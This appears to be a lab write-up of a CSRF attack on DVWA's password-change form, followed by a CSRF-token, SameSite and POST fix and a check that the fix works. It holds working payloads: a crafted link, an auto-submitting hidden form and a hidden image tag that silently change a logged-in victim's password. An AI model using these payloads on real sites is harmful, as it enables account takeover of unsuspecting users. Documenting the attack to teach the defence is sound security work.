@@ -1,0 +1,150 @@
+# Cross-Site Request Forgery (CSRF) — DVWA
+
+Third vulnerability in this task. CSRF is a bit different from SQLi and XSS in that it doesn't rely on injecting malicious code into the target site at all — it abuses the fact that browsers automatically attach a user's session (cookies) to any request sent to a site, regardless of which page actually triggered that request. Tested against DVWA's password-change form at Low security.
+
+## What CSRF actually is
+
+Cross-Site Request Forgery tricks a logged-in user's browser into sending a request to a site they're authenticated on, without them meaning to. The victim doesn't need to type anything or approve anything — just visiting a malicious page (or a page containing a hidden/auto-submitting form or image tag) is enough, because their browser will happily attach the session cookie for the target site to that request automatically.
+
+The core problem: the server has no way to tell the difference between "the user genuinely clicked this on my site" and "the user's browser was told to send this request by some other page." If the only thing checked is "does this request have a valid session cookie," and nothing about *where the request actually originated from*, CSRF is possible.
+
+**A useful way to think about it:** XSS is the attacker's code running *on* the vulnerable site. CSRF is the attacker's request being sent *to* the vulnerable site — from somewhere else — riding on the victim's already-logged-in session.
+
+---
+
+## 1. Where it was tested
+
+DVWA → **CSRF** page — a simple form that lets a logged-in user change their password. It takes `password_new`, `password_conf`, and a submit button, and processes the change via a GET request (deliberately, for the sake of the exercise).
+
+Legitimate request when a user changes their own password normally:
+```
+http://localhost/dvwa/vulnerabilities/csrf/?password_new=newpass123&password_conf=newpass123&Change=Change
+```
+
+Since the whole request lives in the URL as a GET request, and the app doesn't verify where it came from, that URL can be reproduced anywhere.
+
+---
+
+## 2. Building the attack
+
+### Simplest version — just a crafted link
+```
+http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
+```
+If a logged-in victim clicks this (sent via email, chat, forum post, wherever), their DVWA password silently changes to `hacked123` — no confirmation, no visible warning, because the browser sends their session cookie along with the request automatically.
+
+### More realistic version — auto-submitting HTML page
+A plain link requires the victim to click it and might look suspicious anyway. A more convincing approach is a page that fires the request automatically the moment it loads:
+
+```html
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_new" value="hacked123">
+    <input type="hidden" name="password_conf" value="hacked123">
+    <input type="hidden" name="Change" value="Change">
+  </form>
+</body>
+</html>
+```
+
+Host it locally to simulate an attacker's server:
+```bash
+python3 -m http.server 8000
+```
+
+Then get the victim to open it (e.g. `http://attacker-ip:8000/exploit.html`) while they're logged into DVWA in another tab. The page has no visible content — no button, no obvious form — it just loads and immediately fires the password-change request in the background using the victim's active session.
+
+### Even sneakier — hidden image tag (for GET-based CSRF specifically)
+Because this particular vulnerable action uses GET, the entire attack can technically be triggered just by loading an image:
+```html
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" width="0" height="0" style="display:none">
+```
+The browser treats it like it's fetching an image, but it's really just making a GET request to that URL — which is all that's needed to trigger the password change. This is exactly why state-changing actions (like changing a password) should never be done over GET requests in the first place.
+
+---
+
+## 3. Why this works at Low security
+
+DVWA's low-security CSRF page processes the password change purely based on an active, valid session — it doesn't check anything about the origin of the request or require any extra proof that the user intended to submit this specific form from this specific page.
+
+```php
+if (isset($_GET['Change'])) {
+    $pass_new = $_GET['password_new'];
+    $pass_conf = $_GET['password_conf'];
+    if ($pass_new == $pass_conf) {
+        // update password in database — no origin/token check at all
+    }
+}
+```
+
+Any request that reaches this endpoint with a valid session cookie gets processed, regardless of where the request actually came from.
+
+---
+
+## 4. Fix — Token-Based Protection (CSRF tokens)
+
+The fix is to make every state-changing form include a random, unpredictable token generated by the server, tied to that user's session, and to reject the request if the token is missing or doesn't match.
+
+**How it works:**
+1. When the server renders the password-change form, it generates a random token and embeds it as a hidden field.
+2. When the form is submitted, the token comes back along with the request.
+3. The server checks the submitted token against the one it generated for that session — if they don't match (or it's missing), the request is rejected.
+
+An attacker crafting a malicious page from a different origin has no way to know or predict this token, since they can't read it off the real form (browsers block cross-origin reading of another site's page content) — so their forged request will always be missing a valid token.
+
+**Server-side (PHP example):**
+```php
+// Generate token and store in session
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+```
+
+**Embed it in the form:**
+```html
+<form action="/vulnerabilities/csrf/" method="POST">
+  <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+  <input type="password" name="password_new" placeholder="New password">
+  <input type="password" name="password_conf" placeholder="Confirm password">
+  <button type="submit">Change</button>
+</form>
+```
+
+**Validate it on submit:**
+```php
+if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
+    die('CSRF token validation failed');
+}
+// proceed with password change
+```
+
+DVWA's Medium/High CSRF levels implement roughly this pattern with a `user_token` field — worth opening the page source at High security to see it in place.
+
+### Additional hardening that helps alongside tokens
+- **Use POST, not GET, for anything that changes state.** GET requests can be triggered just by loading an image or a link — POST at least requires an actual form submission (though CSRF tokens are still needed, since forms can auto-submit too).
+- **SameSite cookie attribute** — setting session cookies to `SameSite=Strict` or `SameSite=Lax` tells the browser not to send that cookie along with cross-site requests in the first place, which blocks most CSRF attempts at the browser level regardless of tokens:
+  ```
+  Set-Cookie: PHPSESSID=abc123; SameSite=Strict; Secure; HttpOnly
+  ```
+- **Re-authentication for sensitive actions** — asking for the current password before allowing a change adds a layer that a forged request can't satisfy either.
+
+---
+
+## 5. Confirming the fix
+
+1. Set DVWA security to **High**.
+2. View the page source of the CSRF form and note the hidden `user_token` field with a long random value.
+3. Re-run the same crafted HTML page / link from Step 2, using the old static parameters and no token.
+4. Result: the request gets rejected — the password does not change — because the token from the attacker's forged request (empty, or a stale one grabbed earlier) doesn't match what the server expects for the current session.
+
+That's the actual before/after proof: identical attack page, but it stops working the moment the form requires a token the attacker's page can't produce.
+
+---
+
+## Key Takeaways
+
+- CSRF doesn't inject anything into the target site — it abuses the browser's automatic cookie-attachment behavior to forge requests on the victim's behalf.
+- If an action changes state (password, email, money transfer, etc.) and only checks "is there a valid session," it's vulnerable — origin needs to be verified too.
+- The real fix is unpredictable, per-session CSRF tokens validated on every state-changing request — not just switching from GET to POST, since forms can still auto-submit.
+- `SameSite` cookies are a strong extra layer that stops most CSRF at the browser level, but shouldn't be relied on as the only defense.
